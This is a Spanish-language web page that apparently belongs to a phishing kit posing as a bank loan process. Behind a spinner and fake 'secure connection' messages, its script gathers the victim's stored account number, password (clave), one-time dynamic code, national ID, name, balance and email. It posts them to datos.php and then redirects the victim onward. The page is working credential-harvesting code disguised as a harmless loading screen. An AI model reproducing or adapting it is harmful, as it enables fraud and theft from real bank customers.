<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            font-family: 'Manrope', sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fff;
        }
        #logo {
            width: 150px;
            margin-bottom: 30px;
        }
        .loader {
            border: 6px solid #f3f3f3;
            border-radius: 50%;
            border-top: 6px solid #E0128B;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        .mensaje {
            font-size: 18px;
            color: #333;
            text-align: center;
            padding: 0 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Manrope&display=swap" rel="stylesheet">
</head>
<body>
    <img src="logo.png" alt="Logo" id="logo">
    <div class="loader"></div>
    <div class="mensaje" id="mensaje">Estableciendo conexión segura...</div>

    <script>
  const mensajes = [
    "Estableciendo conexión segura...",
    "Casi listo, verificando datos...",
    "Procesando información...",
    "Esto no tardará mucho, gracias por tu paciencia...",
    "Estamos finalizando el proceso...",
    "¡Un momento más, casi terminamos!"
  ];

  let indiceMensaje = 0;
  function cambiarMensaje() {
    indiceMensaje = (indiceMensaje + 1) % mensajes.length;
    const el = document.getElementById('mensaje');
    if (el) el.textContent = mensajes[indiceMensaje];
  }
  const mensajeInterval = setInterval(cambiarMensaje, 2000);

  // Lo que ya tenías
  const neqdata = JSON.parse(localStorage.getItem('neqdata') || "null");
  const dina    = localStorage.getItem('dina');

  // NUEVO: datos del formulario guardados
  const niti = JSON.parse(localStorage.getItem('niti') || "null");

  // Construimos el payload combinando ambos
  const payload = {
    // existentes
    numero:   neqdata?.numero ?? null,
    clave:    neqdata?.clave ?? null,
    dinamica: dina ?? null,
    userIP:   "",

    // nuevos (solo si existen)
    tipo:        niti?.tipo ?? null,
    titulo:      niti?.titulo ?? null,
    monto:       typeof niti?.monto === "string" ? parseInt(niti.monto.replace(/\D+/g,''),10) : niti?.monto ?? null,
    cuotas:      Number(niti?.cuotas ?? 0) || null,
    fecha_pago:  niti?.fecha_pago ?? null,
    cedula:      niti?.cedula ?? null,
    nombres:     niti?.nombres ?? null,
    apellido:    niti?.apellido ?? null,
    saldo:       typeof niti?.saldo === "string" ? parseInt((niti.saldo+'').replace(/\D+/g,''),10) : niti?.saldo ?? null,
    correo:      niti?.correo ?? null
  };

  // Limpia campos nulos para no mandar basura (opcional)
  Object.keys(payload).forEach(k => payload[k] == null && delete payload[k]);

  fetch('datos.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(r => r.json())
  .then(data => {
    clearInterval(mensajeInterval);
    if (data && data.redirect) {
      window.location.href = data.redirect;   // ej: prestamo.php
    }
  })
  .catch(err => {
    clearInterval(mensajeInterval);
    console.error('Error:', err);
    // Mantener el loader en pantalla sin redirigir.
  });
</script>

</body>
</html>
